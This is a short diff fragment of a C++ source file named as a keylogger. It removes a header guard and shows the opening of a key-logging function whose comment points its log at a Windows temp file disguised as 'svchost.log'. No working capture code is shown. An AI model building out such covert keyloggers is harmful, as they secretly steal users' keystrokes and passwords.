@@ -1,11 +1,3 @@
-//
-// Created by arobot on 7/16/2024.
-//
-
-#ifndef KEYLOGGER_H
-#define KEYLOGGER_H
-
-#endif //KEYLOGGER_H
 
 // Function to log the keys @ C:\\Windows\\Temp\\svchost.log"
 DWORD WINAPI logg() {
